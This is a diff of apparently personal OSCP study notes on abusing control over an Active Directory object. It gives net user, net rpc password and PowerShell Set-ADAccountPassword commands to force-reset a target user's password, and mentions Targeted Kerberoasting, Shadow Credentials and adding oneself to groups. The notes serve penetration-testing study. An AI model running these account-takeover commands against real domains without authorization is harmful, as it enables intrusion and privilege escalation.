@@ -3,24 +3,28 @@ You own it completely.
 #### **If target is a User:** 
 1. Force reset their password.
 - **Change the Target’s Password**: Using `net user <username> <password> /domain`, the attacker can reset the user’s password.
-- [[Targeted Kerberoasting]]
-1. Shadow Credentials
+2. [[Targeted Kerberoasting]]
+3. [[Shadow Credentials]]
 #### Change password
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
-const command = `net rpc password [targetUser] '[myNewPW]' -U ${discoveredDomain}/[adminUser]%'[adminPW]' -S {DC Hostname}`;
+const command = `net rpc password [targetUser] '[myNewPW]' -U '${discoveredDomain}/[adminUser]%[adminPW]' -S {DC Hostname}`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
 #### Reset Password
+Run from adminUser cmd
 ```
-net user [user]"pass123!" /domain
+net user [targetUser] "Pass123!" /domain
 ```
 or
+Run from powershell
 ```powershell
-$SecPassword = ConvertTo-SecureString "pass123!" -AsPlainText -Force Set-ADAccountPassword -Identity "Michael" -NewPassword $SecPassword -Reset
+$SecPassword = ConvertTo-SecureString "Pass123!" -AsPlainText -Force
+
+Set-ADAccountPassword -Identity "[targetUser]" -NewPassword $SecPassword -Reset
 ```
 
 #### **If target is a Group:** Add yourself/any user to that group.
